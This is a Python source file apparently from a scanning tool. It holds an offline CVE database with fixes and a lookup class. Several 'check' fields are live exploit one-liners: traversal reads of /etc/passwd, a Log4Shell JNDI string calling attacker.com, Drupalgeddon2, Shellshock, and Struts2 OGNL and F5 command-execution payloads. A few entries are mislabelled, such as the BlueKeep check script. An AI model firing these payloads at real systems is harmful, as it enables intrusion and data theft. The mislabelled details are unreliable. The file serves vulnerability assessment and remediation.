"""
RAJAN CVE Knowledge Base
Offline CVE database for common vulnerabilities
Covers: Web, CMS, Frameworks, Databases, Network services
"""

CVE_DATABASE = {
    # ── Apache ─────────────────────────────────────────────────
    "CVE-2021-41773": {
        "product": "Apache HTTP Server 2.4.49",
        "title": "Apache Path Traversal & RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Path traversal allowing access to files outside document root and RCE if mod_cgi enabled.",
        "check": "curl http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "fix": "Upgrade to Apache 2.4.51+",
        "mitre": "T1190", "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773"],
    },
    "CVE-2021-42013": {
        "product": "Apache HTTP Server 2.4.49-2.4.50",
        "title": "Apache Path Traversal (Bypass of 41773 fix)",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Incomplete fix for CVE-2021-41773 allows further path traversal.",
        "check": "curl http://target/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
        "fix": "Upgrade to Apache 2.4.51+",
        "mitre": "T1190",
    },

    # ── Log4j ──────────────────────────────────────────────────
    "CVE-2021-44228": {
        "product": "Apache Log4j 2.x",
        "title": "Log4Shell — Remote Code Execution",
        "severity": "CRITICAL", "cvss": 10.0,
        "description": "JNDI lookup injection via user-controlled input allows unauthenticated RCE.",
        "check": "Send: ${jndi:ldap://attacker.com/a} in User-Agent, URL, or any logged field",
        "fix": "Upgrade to Log4j 2.15.0+, set log4j2.formatMsgNoLookups=true",
        "mitre": "T1190",
    },

    # ── Spring ─────────────────────────────────────────────────
    "CVE-2022-22965": {
        "product": "Spring Framework 5.3.x < 5.3.18",
        "title": "Spring4Shell — Remote Code Execution",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "RCE via data binding on JDK 9+.",
        "check": "POST with class.module.classLoader.resources.context.parent.pipeline.first.*",
        "fix": "Upgrade to Spring 5.3.18+ or 5.2.20+",
        "mitre": "T1190",
    },

    # ── WordPress ──────────────────────────────────────────────
    "CVE-2022-21661": {
        "product": "WordPress < 5.8.3",
        "title": "WordPress SQL Injection via WP_Query",
        "severity": "HIGH", "cvss": 8.8,
        "description": "SQL injection via tax_query in WP_Query.",
        "check": "Check WordPress version: /wp-login.php or readme.html",
        "fix": "Update to WordPress 5.8.3+",
        "mitre": "T1190",
    },
    "CVE-2019-8942": {
        "product": "WordPress < 5.0.1",
        "title": "WordPress File Upload RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Authenticated file upload leading to RCE via path traversal.",
        "check": "Requires author-level access",
        "fix": "Update to WordPress 5.0.1+",
        "mitre": "T1505.003",
    },

    # ── Drupal ─────────────────────────────────────────────────
    "CVE-2018-7600": {
        "product": "Drupal < 7.58, 8.x < 8.3.9",
        "title": "Drupalgeddon2 — RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Unauthenticated RCE via form API input validation bypass.",
        "check": "GET /?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup",
        "fix": "Update Drupal core",
        "mitre": "T1190",
    },

    # ── Tomcat ─────────────────────────────────────────────────
    "CVE-2020-1938": {
        "product": "Apache Tomcat < 9.0.31, 8.5.51, 7.0.100",
        "title": "Ghostcat — AJP File Read/RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "AJP connector allows file read and RCE if file upload exists.",
        "check": "Check if port 8009 (AJP) is open: nmap -p 8009 target",
        "fix": "Disable AJP connector or upgrade Tomcat",
        "mitre": "T1190",
    },

    # ── Windows ────────────────────────────────────────────────
    "CVE-2017-0144": {
        "product": "Windows SMBv1",
        "title": "EternalBlue — SMB RCE (WannaCry)",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "SMBv1 buffer overflow allowing unauthenticated RCE.",
        "check": "nmap --script smb-vuln-ms17-010 target",
        "fix": "Apply MS17-010 patch, disable SMBv1",
        "mitre": "T1021.002",
    },
    "CVE-2019-0708": {
        "product": "Windows XP/7/2003/2008 RDP",
        "title": "BlueKeep — RDP Pre-auth RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Unauthenticated RCE via RDP without user interaction.",
        "check": "nmap --script rdp-vuln-ms12-020 -p 3389 target",
        "fix": "Apply Microsoft security update KB4499175",
        "mitre": "T1021.001",
    },
    "CVE-2020-0796": {
        "product": "Windows 10 / Server 2019 SMBv3",
        "title": "SMBGhost — SMBv3 RCE",
        "severity": "CRITICAL", "cvss": 10.0,
        "description": "Buffer overflow in SMBv3 compression allows RCE.",
        "check": "nmap --script smb-protocols target",
        "fix": "Apply KB4551762",
        "mitre": "T1021.002",
    },

    # ── SSL/TLS ────────────────────────────────────────────────
    "CVE-2014-0160": {
        "product": "OpenSSL 1.0.1 through 1.0.1f",
        "title": "Heartbleed — OpenSSL Memory Leak",
        "severity": "HIGH", "cvss": 7.5,
        "description": "TLS heartbeat extension leaks server memory including private keys.",
        "check": "nmap --script ssl-heartbleed target",
        "fix": "Upgrade to OpenSSL 1.0.1g+, revoke/reissue certificates",
        "mitre": "T1573",
    },

    # ── Redis ──────────────────────────────────────────────────
    "CVE-2022-0543": {
        "product": "Redis < 6.2.6",
        "title": "Redis Lua Sandbox Escape RCE",
        "severity": "CRITICAL", "cvss": 10.0,
        "description": "Lua sandbox escape via package library allows RCE.",
        "check": "redis-cli -h target ping (check if auth required)",
        "fix": "Upgrade Redis, require auth, bind to localhost",
        "mitre": "T1190",
    },

    # ── Nginx ──────────────────────────────────────────────────
    "CVE-2021-23017": {
        "product": "Nginx < 1.20.1",
        "title": "Nginx DNS Resolver Off-by-one Heap Write",
        "severity": "HIGH", "cvss": 7.7,
        "description": "Off-by-one error in DNS resolver may allow RCE.",
        "check": "Check nginx version: curl -I target | grep Server",
        "fix": "Upgrade to Nginx 1.20.1+",
        "mitre": "T1190",
    },

    # ── PHP ────────────────────────────────────────────────────
    "CVE-2019-11043": {
        "product": "PHP-FPM with Nginx",
        "title": "PHP-FPM Remote Code Execution",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "RCE via specially crafted URL in PHP-FPM+Nginx configs.",
        "check": "curl 'http://target/index.php%0a' (check for 200 response)",
        "fix": "Update PHP, fix Nginx config",
        "mitre": "T1190",
    },

    # ── MongoDB ────────────────────────────────────────────────
    "CVE-2019-2389": {
        "product": "MongoDB < 4.0.11",
        "title": "MongoDB Unauthenticated Access",
        "severity": "HIGH", "cvss": 7.5,
        "description": "Default MongoDB exposed on 27017 without authentication.",
        "check": "mongo --host target --port 27017 (no auth required?)",
        "fix": "Enable auth, bind to localhost, upgrade MongoDB",
        "mitre": "T1190",
    },

    # ── Bash ───────────────────────────────────────────────────
    "CVE-2014-6271": {
        "product": "Bash < 4.3 patch 25",
        "title": "Shellshock — Bash Environment Variable RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "RCE via malformed environment variables in Bash.",
        "check": "curl -H 'User-Agent: () { :; }; echo; /bin/id' http://target/cgi-bin/",
        "fix": "Update Bash to patched version",
        "mitre": "T1059",
    },

    # ── Grafana ────────────────────────────────────────────────
    "CVE-2021-43798": {
        "product": "Grafana 8.0.0-8.3.0",
        "title": "Grafana Path Traversal",
        "severity": "HIGH", "cvss": 7.5,
        "description": "Unauthenticated path traversal via plugin URLs.",
        "check": "curl http://target:3000/public/plugins/alertlist/../../../etc/passwd",
        "fix": "Upgrade to Grafana 8.3.1+",
        "mitre": "T1083",
    },

    # ── GitLab ─────────────────────────────────────────────────
    "CVE-2021-22205": {
        "product": "GitLab CE/EE < 13.10.3",
        "title": "GitLab ExifTool RCE",
        "severity": "CRITICAL", "cvss": 10.0,
        "description": "Unauthenticated RCE via image upload and ExifTool parsing.",
        "check": "Check GitLab version at /help page",
        "fix": "Upgrade to GitLab 13.10.3+",
        "mitre": "T1190",
    },
}


class CVEDatabase:
    def __init__(self):
        self.db = CVE_DATABASE

    def search(self, keyword):
        kw = keyword.lower()
        results = {}
        for cve_id, data in self.db.items():
            if (kw in cve_id.lower() or
                kw in data["product"].lower() or
                kw in data["title"].lower() or
                kw in data["description"].lower()):
                results[cve_id] = data
        return results

    def get(self, cve_id):
        return self.db.get(cve_id.upper())

    def check_product(self, product_string):
        """Check if a detected product matches any known CVEs"""
        product_lower = product_string.lower()
        matches = []
        for cve_id, data in self.db.items():
            prod_lower = data["product"].lower()
            # Extract product name (before version)
            prod_name = prod_lower.split("<")[0].strip().split(" ")[0]
            if prod_name in product_lower or any(
                kw in product_lower for kw in prod_lower.split()[:2]
            ):
                matches.append((cve_id, data))
        return matches

    def print_cve(self, cve_id):
        data = self.db.get(cve_id.upper())
        if not data:
            print(f"  ❌ {cve_id} not in local database")
            print(f"  🔗 Search: https://nvd.nist.gov/vuln/detail/{cve_id}")
            return
        sev_colors = {
            "CRITICAL": "\033[91m", "HIGH": "\033[93m",
            "MEDIUM": "\033[94m", "LOW": "\033[92m"
        }
        color = sev_colors.get(data["severity"], "")
        reset = "\033[0m"
        print(f"\n  ╔══════════════════════════════════════════════════════╗")
        print(f"  ║  {cve_id} — {data['title'][:42]}")
        print(f"  ╠══════════════════════════════════════════════════════╣")
        print(f"  ║  Product  : {data['product']}")
        print(f"  ║  Severity : {color}{data['severity']}{reset} (CVSS {data['cvss']})")
        print(f"  ║  MITRE    : {data['mitre']}")
        print(f"  ╚══════════════════════════════════════════════════════╝")
        print(f"  Description : {data['description']}")
        print(f"  How to Check: {data['check']}")
        print(f"  Fix         : {data['fix']}")
        print()

    def lookup_nvd(self, cve_id):
        """Live lookup from NVD API — fallback when not in local DB"""
        import urllib.request, json
        cve_id = cve_id.upper().strip()
        try:
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
            req = urllib.request.Request(url, headers={"User-Agent": "RAJAN-Scanner/1.0"})
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read().decode())
                vulns = data.get("vulnerabilities", [])
                if not vulns:
                    return None
                cve_data = vulns[0]["cve"]
                desc = cve_data.get("descriptions", [{}])[0].get("value", "No description")
                metrics = cve_data.get("metrics", {})
                cvss = 0.0
                severity = "UNKNOWN"
                for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                    if key in metrics:
                        m = metrics[key][0]
                        cvss = m.get("cvssData", {}).get("baseScore", 0.0)
                        severity = m.get("cvssData", {}).get("baseSeverity", "UNKNOWN")
                        break
                return {
                    "cve_id": cve_id, "title": f"{cve_id} (NVD)",
                    "description": desc[:200], "cvss": cvss,
                    "severity": severity, "source": "NVD Live",
                }
        except Exception:
            return None

    def search_or_fetch(self, query):
        """Search local DB first, then try NVD for CVE-IDs"""
        # Local search first
        results = self.search(query)
        if results:
            return results, "local"
        # If it looks like a CVE ID, try NVD live
        import re
        if re.match(r'CVE-\d{4}-\d+', query.upper()):
            nvd = self.lookup_nvd(query)
            if nvd:
                return {query.upper(): nvd}, "nvd_live"
        return {}, "not_found"

    def print_search_results(self, keyword):
        results, source = self.search_or_fetch(keyword)
        if not results:
            print(f"  No results for '{keyword}' in local DB or NVD.")
            print(f"  Try: https://nvd.nist.gov/vuln/search?query={keyword}")
            return
        tag = " [NVD Live]" if source == "nvd_live" else f" [{len(results)} local]"
        print(f"\n  Found {len(results)} CVE(s) matching '{keyword}'{tag}:\n")
        for cve_id, data in results.items():
            if source == "nvd_live":
                print(f"  {cve_id} — {data['description'][:80]}")
                print(f"  CVSS: {data['cvss']} | Severity: {data['severity']} | Source: NVD Live\n")
            else:
                self.print_cve(cve_id)

    def get_all_critical(self):
        return {
            cid: d for cid, d in self.db.items()
            if d["severity"] == "CRITICAL"
        }


# ── Extended CVE Database ─────────────────────────────────────────────────────
CVE_DATABASE.update({
    # ── Confluence ─────────────────────────────────────────────────────────────
    "CVE-2022-26134": {
        "product": "Atlassian Confluence < 7.18.1",
        "title": "Confluence OGNL Injection RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Unauthenticated RCE via OGNL injection in Confluence Server/Data Center.",
        "check": "curl http://target/command.action?%24%7B%22%22%5B%22class%22%5D.forName%28%22java.lang.Runtime%22%29%7D",
        "fix": "Upgrade to Confluence 7.4.17+, 7.13.7+, 7.14.3+, 7.15.2+, 7.16.4+, 7.17.4+, 7.18.1+",
        "mitre": "T1190",
    },
    # ── Exchange ───────────────────────────────────────────────────────────────
    "CVE-2021-26855": {
        "product": "Microsoft Exchange Server 2013-2019",
        "title": "ProxyLogon — Exchange SSRF",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "SSRF vulnerability allowing pre-auth RCE on Exchange servers.",
        "check": "Check Exchange version: https://target/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application",
        "fix": "Apply KB5000871 security update",
        "mitre": "T1190",
    },
    # ── Citrix ─────────────────────────────────────────────────────────────────
    "CVE-2019-19781": {
        "product": "Citrix ADC / NetScaler < 13.0-58.30",
        "title": "Citrix ADC Path Traversal RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Unauthenticated path traversal leading to arbitrary code execution.",
        "check": "curl https://target/vpn/../vpns/cfg/smb.conf",
        "fix": "Apply Citrix security bulletin CTX267027",
        "mitre": "T1190",
    },
    # ── Pulse Secure ───────────────────────────────────────────────────────────
    "CVE-2019-11510": {
        "product": "Pulse Secure VPN < 9.0R2",
        "title": "Pulse Secure Arbitrary File Read",
        "severity": "CRITICAL", "cvss": 10.0,
        "description": "Unauthenticated arbitrary file read allowing credential theft.",
        "check": "curl -k https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd",
        "fix": "Upgrade to Pulse Secure 9.0R3+",
        "mitre": "T1083",
    },
    # ── VMware ─────────────────────────────────────────────────────────────────
    "CVE-2021-22005": {
        "product": "VMware vCenter Server 6.5-7.0",
        "title": "VMware vCenter File Upload RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Arbitrary file upload via vCenter analytics endpoint without auth.",
        "check": "Check vCenter version at https://target/ui/",
        "fix": "Apply VMware Security Advisory VMSA-2021-0020",
        "mitre": "T1505.003",
    },
    # ── F5 BIG-IP ──────────────────────────────────────────────────────────────
    "CVE-2022-1388": {
        "product": "F5 BIG-IP 13.1.x - 16.1.x",
        "title": "F5 BIG-IP iControl REST Auth Bypass + RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Auth bypass via iControl REST endpoint allowing unauthenticated RCE.",
        "check": "curl -k -s -u 'admin:' https://target/mgmt/tm/util/bash -d '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}'",
        "fix": "Upgrade BIG-IP or apply iControl REST mitigation",
        "mitre": "T1190",
    },
    # ── Fortinet ───────────────────────────────────────────────────────────────
    "CVE-2022-40684": {
        "product": "FortiOS/FortiProxy/FortiSwitch",
        "title": "Fortinet Auth Bypass via Alt Path",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Auth bypass on management interface allowing config read/write.",
        "check": "curl -k 'https://target/api/v2/cmdb/system/admin/admin' -H 'User-Agent: Report Runner' -H 'Forwarded: for=\"[127.0.0.1]:8080\"'",
        "fix": "Upgrade to FortiOS 7.0.7+ or 7.2.2+",
        "mitre": "T1190",
    },
    # ── Jupyter ────────────────────────────────────────────────────────────────
    "CVE-2020-26215": {
        "product": "Jupyter Notebook < 6.1.5",
        "title": "Jupyter Notebook Open Redirect",
        "severity": "MEDIUM", "cvss": 6.1,
        "description": "Open redirect via next parameter on login page.",
        "check": "Navigate to: http://target/login?next=//evil.com",
        "fix": "Upgrade to Jupyter Notebook 6.1.5+",
        "mitre": "T1566",
    },
    # ── Node.js ────────────────────────────────────────────────────────────────
    "CVE-2021-3129": {
        "product": "Laravel Ignition < 2.5.2",
        "title": "Laravel Ignition RCE via Log File",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "RCE via a vulnerable file:// wrapper in Ignition error handler.",
        "check": "Check /_ignition/execute-solution endpoint",
        "fix": "Upgrade facade/ignition to 2.5.2+",
        "mitre": "T1190",
    },
    # ── Jenkins ────────────────────────────────────────────────────────────────
    "CVE-2019-1003000": {
        "product": "Jenkins < 2.138 with Script Security plugin",
        "title": "Jenkins Groovy Script Sandbox Bypass RCE",
        "severity": "HIGH", "cvss": 8.8,
        "description": "Authenticated users can bypass sandbox to execute arbitrary Groovy.",
        "check": "Check Jenkins version at /about page",
        "fix": "Update Script Security Plugin to 1.50+",
        "mitre": "T1059",
    },
    # ── Kubernetes ─────────────────────────────────────────────────────────────
    "CVE-2018-1002105": {
        "product": "Kubernetes < 1.10.11, 1.11.5, 1.12.3",
        "title": "Kubernetes API Server Privilege Escalation",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Privilege escalation via API server connection upgrade bypass.",
        "check": "Check kubectl version --short",
        "fix": "Upgrade to Kubernetes 1.10.11+, 1.11.5+, or 1.12.3+",
        "mitre": "T1548",
    },
    # ── Apache Struts ──────────────────────────────────────────────────────────
    "CVE-2017-5638": {
        "product": "Apache Struts 2.3.5-2.3.31, 2.5-2.5.10",
        "title": "Struts2 Jakarta Multipart RCE (Equifax breach)",
        "severity": "CRITICAL", "cvss": 10.0,
        "description": "RCE via Content-Type header in Jakarta Multipart parser.",
        "check": "curl -H 'Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{''cmd'',''/c'',#cmd}:{'/bin/bash',''-c'',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}' target",
        "fix": "Upgrade to Struts 2.3.32+ or 2.5.10.1+",
        "mitre": "T1190",
    },
    # ── Apache Solr ────────────────────────────────────────────────────────────
    "CVE-2019-17558": {
        "product": "Apache Solr 5.0.0-8.3.1",
        "title": "Solr Velocity Template RCE",
        "severity": "HIGH", "cvss": 8.1,
        "description": "RCE via Velocity template injection when params.resource.loader.enabled=true.",
        "check": "curl 'http://target:8983/solr/admin/cores?wt=json'",
        "fix": "Upgrade to Solr 8.4.0+",
        "mitre": "T1059",
    },
    # ── Weblogic ───────────────────────────────────────────────────────────────
    "CVE-2020-14882": {
        "product": "Oracle WebLogic Server 10.3.6-14.1.1",
        "title": "WebLogic Console Auth Bypass + RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Auth bypass on admin console via URL encoding trick, combined with RCE.",
        "check": "curl http://target:7001/console/images/%252E%252E%252Fconsole.portal",
        "fix": "Apply Oracle Critical Patch Update Oct 2020",
        "mitre": "T1190",
    },
    # ── ProxyShell ─────────────────────────────────────────────────────────────
    "CVE-2021-34473": {
        "product": "Microsoft Exchange Server",
        "title": "ProxyShell — Exchange Pre-auth RCE Chain",
        "severity": "CRITICAL", "cvss": 9.1,
        "description": "Pre-auth RCE chain via SSRF + privilege escalation + deserialization.",
        "check": "Check Exchange version at /ecp/current/",
        "fix": "Apply cumulative update KB5003435",
        "mitre": "T1190",
    },
    # ── Sudo ───────────────────────────────────────────────────────────────────
    "CVE-2021-3156": {
        "product": "sudo < 1.9.5p2",
        "title": "Baron Samedit — sudo Heap Overflow LPE",
        "severity": "HIGH", "cvss": 7.8,
        "description": "Local privilege escalation via heap buffer overflow in sudoedit.",
        "check": "sudoedit -s / (check if crashes or returns sudoedit error)",
        "fix": "Upgrade sudo to 1.9.5p2+",
        "mitre": "T1548",
    },
    # ── PaperCut ───────────────────────────────────────────────────────────────
    "CVE-2023-27350": {
        "product": "PaperCut MF/NG < 22.1.3",
        "title": "PaperCut Auth Bypass + RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "Auth bypass on admin panel + ability to run arbitrary code.",
        "check": "Check PaperCut version at /app?service=page/Home",
        "fix": "Upgrade to PaperCut 22.1.3+",
        "mitre": "T1190",
    },
    # ── MOVEit ─────────────────────────────────────────────────────────────────
    "CVE-2023-34362": {
        "product": "Progress MOVEit Transfer",
        "title": "MOVEit SQL Injection + RCE",
        "severity": "CRITICAL", "cvss": 9.8,
        "description": "SQL injection in MOVEit Transfer web application allowing RCE.",
        "check": "Check for MOVEit Transfer at /human.aspx",
        "fix": "Apply MOVEit security patches from May 2023",
        "mitre": "T1190",
    },
})

